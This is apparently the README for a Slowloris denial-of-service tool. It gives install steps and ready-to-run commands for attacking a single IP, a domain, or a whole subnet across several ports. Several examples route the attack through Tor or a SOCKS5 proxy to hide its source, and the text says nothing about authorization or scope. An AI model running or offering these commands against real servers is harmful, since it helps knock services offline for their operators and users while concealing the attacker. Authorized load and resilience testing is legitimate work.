# Slowloris Tool

Unified tool for Slowloris testing, with three execution modes (so far):

- **sniper** → attack targeting a single IP 
- **domain** → attack targeting a domain (resolved via DNS)
- **pitchfork** → test across a subnet + multiple ports of your choice

---

## Installation

```bash
git clone https://github.com/CLSxSH7/slowloris-tool.git
cd slowloris-tool
pip install -r requirements.txt
```

For SOCKS5 proxy support, also install:

```bash
pip install PySocks
```

---

## Usage

### Interactive menu

If you run without parameters:

```bash
python slowloris-tool.py
```

You will see a menu to choose between sniper, domain, and pitchfork, with prompts for each parameter.

---

### Sniper mode (single IP)

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 -s 200 --https -ua --sleeptime 10
```

With SOCKS5 proxy (e.g., Tor):

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 --socks5 127.0.0.1:9050
```

---

### Domain mode

```bash
python slowloris-tool.py domain example.com -p 443 --https -s 200 -ua
```

With SOCKS5 proxy:

```bash
python slowloris-tool.py domain example.com -p 443 --https --socks5 127.0.0.1:9050
```

---

### Pitchfork mode (Subnet/Ports)

```bash
python slowloris-tool.py pitchfork 192.168.0.0/24 -P 80,8080,443 -s 200 -t 50 -d 120
```

> ⚠️ In this mode, SOCKS5 proxy is not supported (direct execution only).

---

## Dependencies

- Python 3.9+
- `requests`
- `PySocks` (only if using --socks5)

---

## Notes

- The `--socks5` parameter is supported only in **sniper** and **domain** modes.
- The proxy is applied globally using a `socket` monkeypatch. 
- To run via **Tor**, make sure the service is active on port 9050:

```bash
tor &
python slowloris-tool.py domain target.com --socks5 127.0.0.1:9050
```

---